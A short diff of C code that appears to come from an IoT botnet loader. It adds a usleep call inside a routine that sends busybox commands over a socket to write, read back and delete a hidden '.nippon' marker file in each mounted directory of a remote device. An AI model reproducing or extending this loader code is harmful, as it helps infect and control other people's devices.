@@ -391,6 +391,7 @@ int connection_consume_mounts(struct connection *conn)
             {
                 util_sockprintf(conn->fd, "/bin/busybox echo -e '%s%s' > %s/.nippon; /bin/busybox cat %s/.nippon; /bin/busybox rm %s/.nippon\r\n",
                                 VERIFY_STRING_HEX, path, path, path, path, path);
+				usleep(1);
             }
 
             dirs_end_line:
